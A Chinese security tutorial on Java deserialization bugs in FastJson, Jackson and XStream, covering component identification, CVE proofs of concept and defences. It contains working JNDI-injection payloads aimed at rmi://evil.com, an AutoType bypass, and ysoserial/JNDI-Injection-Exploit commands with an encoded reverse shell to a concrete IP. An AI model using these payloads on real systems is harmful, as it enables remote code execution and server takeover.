引言

在现代Java企业级应用（J2EE）中，JSON和XML是两种最常用的数据交换格式。为了高效处理这些数据，开发者通常会引入成熟的解析库，如FastJson、Jackson和XStream。然而，这些组件在带来便利的同时，也引入了严重的安全风险——反序列化漏洞。攻击者可以通过构造恶意数据 payload，在服务端执行任意代码、进行JNDI注入，甚至直接控制服务器。

本文将从攻击者视角出发，结合黑盒检测与白盒分析方法，深入剖析FastJson、Jackson和XStream三大组件的经典漏洞，并给出实战级的POC（Proof of Concept）利用示例。同时，我们还会介绍一些实用的检测工具和靶场环境，帮助安全人员快速识别和验证漏洞，最后总结有效的防御措施。

1. 组件识别：黑盒试探与白盒确认

在对目标应用进行安全评估时，第一步往往是确定其使用的组件类型及版本。针对数据处理组件，我们可以通过以下两种方式进行识别。

黑盒检测：通过报错信息判断组件

黑盒测试中，我们无法看到源代码，但可以通过提交异常数据，观察服务端的响应来推断组件。

· JSON数据格式：如果应用接收JSON格式的数据，当提交非法JSON或包含特定组件的特有字段时，返回的报错信息可能泄露组件名称。例如，FastJson的报错常包含com.alibaba.fastjson，Jackson的报错则可能包含com.fasterxml.jackson。
· XML数据格式：如果应用接收XML，提交格式错误或包含外部实体的XML，报错信息可能暴露XStream或JAXB等库的痕迹。XStream特有的报错如com.thoughtworks.xstream.converters.ConversionException。

实践技巧：可以尝试修改Content-Type头为application/json或application/xml，并分别发送简单的测试数据，观察响应差异。例如：

```
GET /api/user HTTP/1.1
Content-Type: application/json

{"id":1}
```

如果服务端返回400并提示JSON解析错误，则可能使用了JSON解析器。进一步构造包含@type（FastJson特色）或包含多态类型的Jackson payload，观察是否触发异常。

白盒检测：直接查看依赖版本

在有源码或可以获取到应用依赖包的情况下，直接查看pom.xml、build.gradle或WEB-INF/lib下的jar包即可确定组件及其版本。

· FastJson：fastjson-1.2.xx.jar
· Jackson：jackson-databind-2.x.x.jar
· XStream：xstream-1.4.x.jar

确定版本后，可对照官方漏洞通告（如阿里云漏洞库 https://avd.aliyun.com ）确认是否存在已知漏洞。

2. 三大组件漏洞分析与实战

2.1 Jackson：多态反序列化导致的RCE

Jackson是Spring Boot默认的JSON处理库，其多态反序列化功能（通过@class或@type指定具体类）曾爆出多个远程代码执行漏洞。

漏洞示例：CVE-2020-8840

· 影响版本：jackson-databind 2.0.0 - 2.9.10.2
· 漏洞原理：当Jackson启用了默认类型验证（enableDefaultTyping()）或使用了@JsonTypeInfo注解，攻击者可以通过构造特定的类（如org.apache.xbean.propertyeditor.JndiConverter）触发JNDI注入，进而执行任意代码。

POC构造：

```java
String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/Exploit\"}]";
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
mapper.readValue(json, Object.class);
```

当服务端使用enableDefaultTyping时，上述JSON会被反序列化，JndiConverter的asText方法会尝试从LDAP服务器加载对象，若LDAP服务返回一个恶意Java类，即可触发RCE。

漏洞示例：CVE-2020-35728

· 影响版本：jackson-databind 2.x < 2.9.10.8
· 利用类：com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool

POC：

```java
String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"rmi://evil.com:1099/Exploit\"}]";
```

利用链与前者类似，通过JNDI路径注入，最终导致RCE。

实战建议：检测Jackson漏洞时，可以使用ysoserial生成JNDI payload，配合LDAP或RMI服务进行验证。

2.2 FastJson：AutoType机制下的反序列化深渊

FastJson因其实时高效的性能在国内被广泛使用，但其自动类型（AutoType）功能一直是安全的重灾区。攻击者通过@type字段指定任意类，如果该类存在于classpath且满足利用条件，即可实现任意代码执行。

经典漏洞：1.2.24及以下版本

· POC（利用JdbcRowSetImpl进行JNDI注入）：

```java
String payload = "{\n" +
        "    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
        "    \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\n" +
        "    \"autoCommit\":true\n" +
        "}";
JSON.parseObject(payload);
```

此版本AutoType默认开启，且JdbcRowSetImpl的dataSourceName属性被设置为恶意RMI地址，在autoCommit触发时会连接RMI服务，导致JNDI注入。

绕过1.2.25-1.2.47的checkAutotype

1.2.25开始增加了AutoType黑名单，但1.2.47版本又引入了绕过方式，利用java.lang.Class将恶意类加载进缓存，然后再实例化。

· POC（1.2.47版本）：

```java
String payload = "{\n" +
        "    \"a\":{\n" +
        "        \"@type\":\"java.lang.Class\",\n" +
        "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
        "    },\n" +
        "    \"b\":{\n" +
        "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
        "        \"dataSourceName\":\"rmi://evil.com:1099/Exploit\",\n" +
        "        \"autoCommit\":true\n" +
        "    }\n" +
        "}";
```

该payload首先通过java.lang.Class将JdbcRowSetImpl加载进缓存，然后利用b对象正常实例化，从而绕过了checkAutotype的检测。

1.2.80及之后的绕过

高版本FastJson加强了黑名单，但攻击者仍可利用目标应用中存在的第三方库中的gadget进行绕过。此时需要结合具体环境，寻找可用的利用链（如利用org.apache.ibatis.datasource等）。

利用工具：

· FastJson Payload集合：https://github.com/kezibei/fastjson_payload
· Burp Suite探测插件：
  · TsojanScan
  · FastjsonScan (Maskhe)
  · BurpFastJsonScan (pmiaowu)
  · FastjsonScan4Burp (Niiiiko)
· 靶场复现：https://github.com/lemono0/FastJsonParty

2.3 XStream：XML数据中的隐藏杀机

XStream是一个Java类库，用于将对象序列化为XML，或从XML反序列化为对象。它的漏洞多与JNDI注入、动态代理有关。

漏洞示例：CVE-2021-21351（<=1.4.15）

· 原理：通过构造恶意的XML，利用XStream对javax.naming.ldap.Rdn$RdnEntry的处理，最终触发JNDI注入。

Payload生成步骤：

1. 使用JNDI注入工具生成反弹Shell的JNDI payload：
   ```bash
   java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 47.94.236.117
   ```
2. 将生成的RMI地址替换进XML payload（详见提供内容）。

漏洞示例：CVE-2021-29505（<=1.4.16）

· 原理：利用java.util.PriorityQueue的反序列化过程，触发对com.sun.xml.internal.ws.api.message.Packet的特定处理，最终通过JNDI注入实现RCE。

Payload生成：

```bash
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

将上述JRMPListener地址填入XML payload中的<registry>元素，即可触发。

关键点：XStream的Payload通常非常复杂，但可以通过工具自动生成。实际测试中，我们应当重点关注Content-Type为application/xml的接口，并尝试提交包含恶意外部实体的XML。

3. 自动化检测与靶场复现

手动构造Payload耗时且容易出错，借助社区提供的工具可以大大提高检测效率。

· FastJson扫描插件：将上述Burp插件安装在Burp Suite中，可自动识别FastJson并探测版本，部分插件还能直接验证漏洞。
· 通用反序列化工具：ysoserial、JNDI-Injection-Exploit等，用于生成JNDI利用链。
· 靶场环境：FastJsonParty项目提供了从低版本到高版本的完整漏洞复现环境，适合安全人员实战练习。

4. 防御措施：如何避免成为受害者

1. 及时升级组件版本：
   · FastJson：至少升级到1.2.83或最新版本。
   · Jackson：保持jackson-databind在最新版本，并关注Github安全公告。
   · XStream：升级到1.4.19以上。
2. 禁用AutoType或多态特性：
   · FastJson：设置ParserConfig.getGlobalInstance().setAutoTypeSupport(false);。
   · Jackson：避免使用enableDefaultTyping()，或自定义白名单。
   · XStream：使用XStream时，通过xstream.denyTypes()添加黑名单。
3. 输入验证与过滤：对JSON/XML中的类型字段进行严格校验，禁止非预期的类名出现。
4. 最小化权限原则：运行Java应用的账户不应拥有过高权限，即使被攻击也能降低影响。
5. 使用RASP（运行时应用自我保护）：部署RASP产品可在漏洞利用阶段实时阻断恶意调用。

结语

FastJson、Jackson和XStream作为Java生态中不可或缺的数据处理组件，其安全性直接影响着无数应用的安全。通过本文的实战分析，我们不仅理解了漏洞产生的根源，也掌握了从识别到利用再到防御的完整流程。希望读者能够将这些知识运用到实际的安全评估与开发中，共同构建更安全的Java应用。

安全无小事，每一行代码都可能成为攻击者的突破口。保持学习，保持警惕。
